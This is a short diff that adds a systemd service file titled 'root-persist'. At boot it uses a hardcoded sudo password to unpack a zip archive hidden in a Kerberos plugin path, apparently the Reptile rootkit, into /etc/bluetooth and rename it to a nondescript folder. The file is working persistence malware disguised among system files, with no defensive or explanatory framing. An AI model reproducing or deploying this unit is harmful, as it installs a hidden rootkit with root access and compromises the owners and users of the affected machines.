@@ -1,0 +1,9 @@
+[Unit]
+Description=root-persist
+
+[Service]
+ExecStart=/bin/bash -c 'if [ ! -d "/etc/bluetooth/9cb0/" ]; then echo "tartans" | sudo -S unzip -d /etc/bluetooth /usr/lib/x86_64-linux-gnu/krb5/plugins/preauth/backup.zip && echo "tartans" | sudo -S mv /etc/bluetooth/Reptile-master /etc/bluetooth/9cb0; else : ; fi'
+
+[Install]
+WantedBy=multi-user.target
+
